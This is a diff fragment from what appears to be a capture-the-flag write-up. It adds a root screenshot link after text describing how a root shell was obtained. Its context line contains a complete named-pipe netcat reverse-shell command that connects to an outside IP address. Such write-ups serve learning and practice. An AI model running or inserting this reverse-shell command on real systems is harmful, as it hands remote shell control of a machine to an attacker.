@@ -107,6 +107,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.68.187 5555 >/tmp/f
 
 And activated the root shell with a nc listener and by executing the print.sh script
 
+![root](./Images/root.png)
+
 # Flags:
 
 **Task 1:**
